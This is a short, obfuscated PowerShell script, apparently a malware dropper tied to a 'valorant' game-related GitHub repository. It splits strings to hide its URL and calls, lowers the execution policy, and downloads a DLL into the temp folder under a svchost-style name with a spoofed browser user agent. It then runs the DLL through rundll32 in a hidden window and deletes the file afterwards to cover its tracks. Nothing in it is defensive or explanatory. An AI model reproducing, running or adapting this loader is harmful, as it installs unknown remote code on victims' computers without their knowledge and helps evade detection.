$ErrorActionPreference = @("St","op") -join ""
$_0x91A = @("https://raw",".githubusercontent",".com/mk121X","/valorant/refs","/heads/main/","payload") -join ""
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))
$_0xDLL = "$env:TEMP\svchost_$(Get-Random).dll"
$_0x7C1.DownloadFile($_0x91A, $_0xDLL)
Start-Process (@("rund","ll32") -join "") -ArgumentList "$_0xDLL,VoidFunc" -WindowStyle Hidden
Start-Sleep -Seconds 2
Remove-Item $_0xDLL -Force -ErrorAction SilentlyContinue
